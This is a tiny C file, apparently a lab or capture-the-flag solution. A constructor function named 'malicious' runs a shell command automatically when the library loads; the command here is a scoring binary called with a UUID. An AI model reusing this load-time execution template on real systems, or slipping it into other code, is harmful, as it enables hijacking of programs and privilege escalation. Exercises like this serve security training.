#include<stdio.h>
#include<stdlib.h>

static void malicious() __attribute__((constructor));

void malicious() {
    system("/usr/local/bin/score 8e32d365-6442-4f30-8f1f-0a39bbcfecde");
  }
